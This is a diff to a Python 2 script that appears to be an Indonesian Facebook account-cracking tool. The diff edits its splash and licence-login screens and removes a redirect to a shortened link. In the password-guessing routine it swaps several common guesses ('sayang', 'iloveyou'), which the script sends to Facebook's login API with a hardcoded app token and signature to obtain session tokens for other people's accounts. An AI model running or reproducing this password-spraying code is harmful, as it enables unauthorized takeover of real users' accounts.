@@ -80,23 +80,23 @@ def siapa():
 	os.system('clear')
 	nama = raw_input("\033[1;97mJeneng Mu Sopo Cok ? \033[1;91m: \033[1;92m")
 	if nama =="":
-		print"\033[1;96m[!] \033[1;91mIsi yang benar Goblok"
+		print"\033[1;96m[!] \033[1;91mIsi yang benar "
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJangan lupa bahagia boskuh Script E Ojo Dingge Ngawor Goblok :( !!")
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJangan lupa bahagia boskuh!!")
 		time.sleep(1)
 		loginSC()
 		
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu bro,kalau gak tau Lisensinya,silahkan Download Sendiri Jangan Manja Anjing.!\n"
-	os.system('xdg-open https://ockles.com/mHvZtek4na6U2WAYF')
+	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu bro,\n"
+	
         username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="Koi"and password =="Bukis":
+	if username =="Dark"and password =="Fb":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
 		login()
@@ -379,7 +379,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'sembiring'
+									pass4 = 'sayang'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -412,7 +412,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'doraemon'
+													pass6 = 'iloveyou'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
